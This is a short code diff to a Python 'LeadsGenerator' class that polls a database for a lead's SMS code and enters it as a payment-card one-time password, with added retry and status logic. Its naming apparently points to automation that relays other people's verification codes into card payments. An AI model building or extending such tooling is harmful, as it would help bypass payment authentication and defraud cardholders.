@@ -172,9 +172,12 @@ class LeadsGenerator:
         for _ in range(3):
             self._check_stopped(initializer, session_id, lead_id)
 
+            code = None
+
             try:
                 code = self._get_payment_otp(session_id=session_id,
-                                             lead_id=lead_id)
+                                             lead_id=lead_id,
+                                             prev_code=code)
 
                 initializer.enter_payment_card_otp(code=code)
 
@@ -238,10 +241,14 @@ class LeadsGenerator:
 
         return code
 
-    def _get_payment_otp(self, session_id: int, lead_id: int):
+    def _get_payment_otp(self, session_id: int,
+                         lead_id: int,
+                         prev_code: str = None):
         START = time.time()
-        sms_code = self._db_service.get(session_id=session_id,
-                                        lead_id=lead_id)[0].sms_code
+        sms_code = prev_code or self._db_service.get(
+            session_id=session_id,
+            lead_id=lead_id
+        )[0].sms_code
         USE_FORCE = False
 
         while time.time() - START < 120:
@@ -265,7 +272,9 @@ class LeadsGenerator:
 
             if ((lead.sms_code != sms_code) and
                     lead.sms_code and
-                    lead.sms_code.isdigit()):
+                    lead.sms_code.isdigit()) or (
+                lead.status == LeadGenResultStatus.CODE_RECEIVED
+            ):
                 print(f"OTP LOADED {lead_id} - {lead.sms_code}")
                 return lead.sms_code
 
